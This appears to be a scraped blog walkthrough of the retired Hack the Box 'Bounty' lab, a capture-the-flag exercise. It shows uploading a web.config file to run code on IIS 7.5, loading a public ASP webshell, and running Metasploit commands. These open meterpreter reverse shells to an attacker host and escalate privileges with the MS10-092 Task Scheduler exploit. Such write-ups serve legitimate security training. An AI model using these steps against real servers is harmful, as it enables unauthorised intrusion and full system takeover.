@@ -1,0 +1,281 @@
+
+								
+																		Hack the Box: Bounty Walkthrough
+								
+								
+								
+								
+									
+										posted inPenetration Testing									
+									
+									
+									on October 31, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Today we are going to solve another CTF challenge “Bounty”. It is a retired vulnerable lab presented by Hack the Box for helping pentester’s to perform online penetration testing according to your experience level; they have a collection of vulnerable labs as challenges, from beginners to Expert level.
+Level: Medium
+Task: To find user.txt and root.txt file
+Table of Content
+Scanning
+
+Open ports and Running services (Nmap)
+
+Enumeration
+
+Web Directory enumeration (Dirbuster)
+
+Exploiting Vulnerability 
+
+Abusing HTTP through IIS/7.5
+Generate RCE by uploading web.config
+
+Access victim’s shell
+
+Execute PowerShell one-liner in RCE (Metasploit)
+Get user.txt flag
+
+Privilege Escalation  
+
+Exploit kernel to get high privilege shell (Metasploit)
+Get root.txt flag
+
+Note: Since these labs are online available therefore they have a static IP. The IP of Bounty is 10.10.10.93
+Walkthrough
+Scanning
+Let’s start off with our basic nmap command to find out the open ports and services.
+
+		
+		
+			
+			
+			
+			
+nmap –A 10.10.10.93
+			
+				
+					
+				
+					1
+				
+						nmap –A 10.10.10.93
+					
+				
+			
+		
+
+Things to be observers from its result are port 80 is open for HTTP and Microsoft-IIS/7.5 is service banner.
+
+Let’s navigate to port 80 through a web browser. By exploring IP in the URL box, it puts up following web page as shown in the below image.
+
+Enumeration 
+Since we didn’t get any remarkable clue from the home page, therefore, we have opted Dirbuster tool for directory enumeration thus execute the following, here we had used directory-list-2.3-medium.txt directory for web directory enumeration.
+
+Hmm!! Here I received HTTP response for /transfer.aspx file and /uploadedFiles directories.
+
+When we have explored 10.10.10.93/transfer.aspx in the browser and further welcomed by following web Page given below. The following web page lets you upload a file.
+
+We try to have many attempts to upload a file but every time we get a message “Invalid File. Please try again”.
+
+Exploiting Vulnerability 
+ After so many efforts, I found this link on googling “IIS 7.5 rce upload”. Here we read about the web.config file, which plays an important role in storing IIS7 (and higher) settings. It is very similar to a .htaccess file in Apache web server. Uploading a .htaccess file to bypass protections around the uploaded files is a known technique.
+
+So with the help of above-given link, we create an asp file to run web.config which will respond by adding 1 and 2.
+
+As you can observe, our web.config file is successfully uploaded inside /uploadedfiles/ directory.
+
+So we have executed this file, it has given the expected response “3” which is the sum of 1 and 2. Hence now we can inject malicious code in this file which can create RCE vulnerability through it.
+
+Luckily!! I found this link:  https://raw.githubusercontent.com/tennc/webshell/master/asp/webshell.asp link for ASP webshell. So I copied the whole content of asp webshell on our web.config file and upload it.
+
+Access victim’s shell
+On executing the updated web.config file, it creates a form where we can run the command as RCE. Once such surface you can run any malicious command to exploit RCE. Here we will be executing PowerShell code generated via the web delivery module of Metasploit.
+
+		
+		
+			
+			
+			
+			
+msf use exploit/multi/script/web_delivery
+msf exploit(multi/script/web_delivery) set srvhost 10.10.14.2
+msf exploit(multi/script/web_delivery) set target 2
+msf exploit(multi/script/web_delivery) set payload windows/x64/meterpreter/reverse_tcp
+msf exploit(multi/script/web_delivery) set lhost 10.10.14.2
+msf exploit(multi/script/web_delivery) run
+			
+				
+					
+				
+					123456
+				
+						msf use exploit/multi/script/web_deliverymsf exploit(multi/script/web_delivery) set srvhost 10.10.14.2msf exploit(multi/script/web_delivery) set target 2msf exploit(multi/script/web_delivery) set payload windows/x64/meterpreter/reverse_tcpmsf exploit(multi/script/web_delivery) set lhost 10.10.14.2msf exploit(multi/script/web_delivery) run
+					
+				
+			
+		
+
+Past the highlighted code given in the image Metasploit inside the text file and run this code to get a meterpreter session.
+
+Great!! We have successfully got the meterpreter session of the victim’s machine, now let’s find out the user.txt file to finish this task.
+
+We successfully found the user.txt file inside /users/merlin/Desktop. Next, we need to find out the root.txt file to finish this challenge and as we know for that we need to escalated root privilege.
+
+Privilege Escalation
+Then I run a post exploit “Multi Recon Local Exploit Suggester” that suggests local meterpreter exploits that can be used for the further exploit. The exploits are recommended founded on the architecture and platform that the user has a shell opened as well as the available exploits in meterpreter.
+
+		
+		
+			
+			
+			
+			
+use post/multi/recon/local_exploit_suggester
+msf post(multi/recon/local_exploit_suggester) &gt; set session 1
+msf post(multi/recon/local_exploit_suggester) &gt; exploit
+			
+				
+					
+				
+					123
+				
+						use post/multi/recon/local_exploit_suggestermsf post(multi/recon/local_exploit_suggester) &gt; set session 1msf post(multi/recon/local_exploit_suggester) &gt; exploit
+					
+				
+			
+		
+
+Wonderful!! Exploit Suggester truly proof itself by suggesting another exploit name to which target is vulnerable. So now we will go with the first option as highlighted in the image.
+
+This Vulnerability in Task Scheduler could allow elevation of privileges. This module has been tested on vulnerable builds of Windows Vista, Windows 7, Windows Server 2008 x64 and x86.
+
+		
+		
+			
+			
+			
+			
+use exploit/windows/local/ms10_092_schelevator
+msf post(windows/local/ms10_092_schelevator) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf post(windows/local/ms10_092_schelevator) &gt; set lhost  10.10.14.2
+msf post(windows/local/ms10_092_schelevator) &gt; set lport 5555
+msf post(windows/local/ms10_092_schelevator) &gt; set session 1
+msf post(windows/local/ms10_092_schelevator) &gt; exploit
+			
+				
+					
+				
+					123456
+				
+						use exploit/windows/local/ms10_092_schelevatormsf post(windows/local/ms10_092_schelevator) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcpmsf post(windows/local/ms10_092_schelevator) &gt; set lhost  10.10.14.2msf post(windows/local/ms10_092_schelevator) &gt; set lport 5555msf post(windows/local/ms10_092_schelevator) &gt; set session 1msf post(windows/local/ms10_092_schelevator) &gt; exploit
+					
+				
+			
+		
+
+
+Another Meterpreter session gets opened, once the selected exploit has been executed.
+
+		
+		
+			
+			
+			
+			
+getsystem
+getuid
+			
+				
+					
+				
+					12
+				
+						getsystemgetuid
+					
+				
+			
+		
+
+As we can see that we are logged into the system as Windows privileged user NT AUTHORITY\SYSTEM
+
+Successfully we have found the the root.txt from the path: C:\Users\Administrator\Desktop.
+Wonderful!! We had completed both tasks and hacked this box.
+Happy Hacking!!!!
+
+Author: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
